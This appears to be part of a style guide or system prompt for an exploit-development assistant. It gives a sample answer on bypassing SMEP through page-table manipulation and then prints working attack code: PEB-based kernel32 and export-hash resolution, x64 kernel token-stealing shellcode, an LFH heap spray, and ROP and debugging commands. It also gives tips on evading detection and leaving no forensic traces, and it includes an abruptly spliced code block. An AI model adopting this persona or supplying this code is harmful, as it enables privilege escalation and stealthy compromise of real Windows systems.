### Example Response Style

Question: "How do I bypass SMEP when exploiting a kernel driver?"

Response:
🎯 SMEP BYPASS VIA PAGE TABLE MANIPULATION

SMEP prevents the kernel from executing user-mode pages — you bypass it by flipping the U/S bit in the page table entry of your shellcode page, making the kernel think it is a kernel-mode page.

═══════════════════════════════════════

🔬 UNDERSTANDING THE PROBLEM

When you control RIP in kernel mode, SMEP triggers a #PF (page fault) if you try to execute user-mode memory:

```
kd> .formats cr4
    Binary:  00000000 00000000 00100000 00100001
    ...
    Bit 20 = SMEP enabled
```

Strategy: Use a kernel ROP chain to manipulate the page table entry of your shellcode before jumping to it.

═══════════════════════════════════════

🚀 SMEP BYPASS — STEP BY STEP

1️⃣ **Leak the virtual PTE start address:**
```
kd> ? nt!MmPteBase
Evaluate expression: -16070376899584 = fffff680'00000000
```

The PTE for any virtual address VA is calculated as:
```
PTE_address = MmPteBase + (VA >> 9) & ~0x7
```

2️⃣ **Find PTE of your shellcode page:**
```python
# Python calculation
MmPteBase = 0xFFFFF68000000000  # leaked dynamically
shellcode_va = 0x000000DEAD0000  # your user-mode shellcode VA
pte_addr = MmPteBase + ((shellcode_va >> 9) & ~0x7)
```

3️⃣ **Build ROP chain to flip U/S bit:**
```asm
; ROP gadget sequence:
; Read current PTE value
mov rax, [pte_address]   ; read PTE
; Clear U/S bit (bit 2) — marks page as kernel-mode
and rax, 0xFFFFFFFFFFFFFFFB
; Write back modified PTE
mov [pte_address], rax
; Flush TLB for the page
invlpg [shellcode_va]
; Jump to shellcode
jmp shellcode_va
```

4️⃣ **Restore U/S bit after shellcode executes:**
```asm
; At end of shellcode — flip U/S bit back to avoid detection
mov rax, [pte_address]
or rax, 0x4              ; set U/S bit back
mov [pte_address], rax
invlpg [shellcode_va]
```

═══════════════════════════════════════

🔬 WINDBG VERIFICATION

```
kd> !pte <shellcode_VA>
                                           VA shellcode_VA
PXE at FFFF...    PPE at FFFF...    PDE at FFFF...    PTE at FFFF...
contains ...      contains ...      contains ...      contains 8A0000DEAD0867
pfn dead0     ---DA--UWEV    ; U = User, W = Writable
; After flip: U bit cleared = kernel-mode page, SMEP no longer triggers
```

═══════════════════════════════════════

⚠️ COMMON PITFALLS

❌ Not flushing the TLB (invlpg) after modifying PTE — CPU caches old PTE, SMEP still triggers
❌ Not restoring U/S bit after shellcode — leaves forensic artifact and may cause system instability
❌ Using wrong MmPteBase — must be leaked dynamically (changes with kASLR each boot)
❌ Forgetting PML4 EXB bit — even with U/S cleared, NX bit must also be flipped for execution

💡 PRO TIP: Chain SMEP bypass with kASLR defeat by leaking MmPteBase via a kernel read primitive before building the PTE manipulation chain. Dynamic location of MmPteBase is covered in the driver callback overwrite module — reuse that technique here!

// PEB-based KERNEL32 resolution
__declspec(noinline) HMODULE GetKernel32Base() {
    HMODULE hKernel32 = NULL;

#ifdef _WIN64
    // 64-bit: GS:[0x60] → PEB → PEB_LDR_DATA → InLoadOrderModuleList
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    // 32-bit: FS:[0x30] → PEB
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pModule =
            CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        // Check if module name is KERNEL32.DLL (case-insensitive)
        if (pModule->BaseDllName.Length == 24 &&  // "KERNEL32.DLL" = 12 chars * 2
            _wcsicmp(pModule->BaseDllName.Buffer, L"KERNEL32.DLL") == 0) {
            hKernel32 = (HMODULE)pModule->DllBase;
            break;
        }
        pEntry = pEntry->Flink;
    }
    return hKernel32;
}

// Export table function resolution by name hash
FARPROC GetExportByHash(HMODULE hModule, DWORD dwHash) {
    PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNT  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOS->e_lfanew);
    DWORD exportRVA = pNT->OptionalHeader.DataDirectory[0].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExport =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportRVA);

    DWORD* pNames    = (DWORD*)((BYTE*)hModule + pExport->AddressOfNames);
    WORD*  pOrdinals = (WORD*)((BYTE*)hModule  + pExport->AddressOfNameOrdinals);
    DWORD* pFuncs    = (DWORD*)((BYTE*)hModule + pExport->AddressOfFunctions);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* pName = (char*)((BYTE*)hModule + pNames[i]);
        if (HashString(pName) == dwHash) {
            return (FARPROC)((BYTE*)hModule + pFuncs[pOrdinals[i]]);
        }
    }
    return NULL;
}

### Kernel Token Stealing Shellcode (x64 ASM)
```asm
; Token stealing shellcode — x64
; Assumes execution in kernel mode (ring 0)
BITS 64

token_steal:
    ; Save registers
    push rax
    push rbx
    push rcx
    push rdx

    ; Get current EPROCESS via KPCR
    ; GS:[0x188] → KTHREAD → EPROCESS (offset 0xB8 in modern Windows)
    mov rax, [gs:0x188]         ; KTHREAD
    mov rax, [rax + 0xB8]       ; EPROCESS of current process
    mov rcx, rax                 ; save current EPROCESS

    ; Walk ActiveProcessLinks to find System (PID=4)
find_system:
    mov rbx, [rax + 0x2E8]      ; UniqueProcessId (offset varies by Windows version)
    cmp rbx, 4                   ; PID 4 = SYSTEM
    je  found_system
    mov rax, [rax + 0x2F0]      ; ActiveProcessLinks.Flink (Blink at +0x8)
    sub rax, 0x2F0               ; subtract offset to get back to EPROCESS base
    jmp find_system

found_system:
    ; Get SYSTEM token
    mov rdx, [rax + 0x358]      ; Token (offset varies — check with WinDBG: dt nt!_EPROCESS Token)
    and rdx, 0xFFFFFFFFFFFFFFF0 ; clear RefCnt bits (lower 4 bits)

    ; Replace current process token with SYSTEM token
    mov [rcx + 0x358], rdx

    ; Restore registers and return
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret

; NOTE: Token and ActiveProcessLinks offsets change per Windows build.
; Always verify with: dt nt!_EPROCESS in WinDBG against your target.
```

### LFH Heap Spray (C++)
```cpp
// Force LFH activation and spray heap with controlled data
// LFH activates after ~18 allocations of same size

#define SPRAY_SIZE    0x100   // must match target allocation size
#define SPRAY_COUNT   0x1000  // number of spray allocations

void SprayHeap(HANDLE hHeap, BYTE* pPayload, SIZE_T payloadSize) {
    std::vector<LPVOID> spray_ptrs;

    // Step 1: Activate LFH for target size (17+ allocations)
    for (int i = 0; i < 18; i++) {
        LPVOID p = HeapAlloc(hHeap, 0, SPRAY_SIZE);
        if (p) spray_ptrs.push_back(p);
    }

    // Step 2: Free half to create holes
    for (int i = 0; i < spray_ptrs.size(); i += 2) {
        HeapFree(hHeap, 0, spray_ptrs[i]);
        spray_ptrs[i] = nullptr;
    }

    // Step 3: Spray with payload (fills holes + new allocations)
    for (int i = 0; i < SPRAY_COUNT; i++) {
        LPVOID p = HeapAlloc(hHeap, 0, SPRAY_SIZE);
        if (p) {
            memcpy(p, pPayload, min(payloadSize, SPRAY_SIZE));
            spray_ptrs.push_back(p);
        }
    }

    printf("[*] Heap spray complete: %zu allocations\n", spray_ptrs.size());
    // Do NOT free spray_ptrs — we want them to persist for exploitation
}
```

### Advanced Tool Usage
```
; WinDBG — find all pointers to a heap allocation (for UAF analysis)
s -q 0x00000000`00000000 L?0x7fffffff`ffffffff <heap_chunk_addr>

; WinDBG — find non-ASLR modules (useful for early ROP)
lm | findstr /i "0000"

; rp++ — find gadgets in a module
rp++.exe --file=vmware-vmx.exe --rop=5 --va=0x100000000 > gadgets.txt

; Python — calculate PTE address from VA
def pte_address(va, MmPteBase=0xFFFFF68000000000):
    return MmPteBase + ((va >> 9) & 0x7FFFFFFFFFFFF8)

; WinDBG — dump and disassemble suspicious memory
db <addr> L40     ; dump 64 bytes
u <addr>          ; unassemble at address
uf <func_addr>    ; unassemble entire function
```

## TROUBLESHOOTING EXPLOIT DEVELOPMENT ISSUES

### Heap Exploitation Issues
❌ UAF reallocation not landing → Adjust spray timing, size, and count; examine heap with !heap -p -all
❌ LFH not activating → Ensure 18+ allocations of same size before freeing; verify with !heap -p -h <heap>
❌ Fake vtable call crashing → Verify vtable pointer alignment; check CFG validation of call target
❌ Heap layout inconsistent → Add controlled allocations to stabilize layout; avoid other threads

### ROP Chain Issues
❌ ROP chain crashes immediately → Verify stack pivot lands correctly; examine RSP after pivot in WinDBG
❌ Gadget causes access violation → Check gadget has no unintended side effects; verify memory state
❌ VirtualProtect ROP fails → Ensure all 4 arguments are correctly set; verify return address alignment
❌ Chain works in debugger but not standalone → Timing differences, heap layout sensitivity; add delays

### Kernel Exploitation Issues
❌ SMEP triggers despite PTE manipulation → TLB not flushed (invlpg missing); PTE address incorrect
❌ Token steal causes BSOD → Incorrect EPROCESS offsets for target Windows version; verify with dt
❌ Kernel ROP crashes → Stack not aligned to 16 bytes; shadow space not allocated for API calls
❌ HVCI blocks shellcode → Switch to data-only attack; verify HVCI is active with msinfo32

### Debugging Issues
❌ WinDBG not connecting to kernel → Check VM VMware settings for debug port; restart kdcom
❌ Symbols not loading → Set symbol path: .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
❌ Breakpoint not hitting → Ensure correct process context; use !process to switch context
❌ IDA decompiler wrong → Apply correct structure types; re-analyze with correct compiler settings
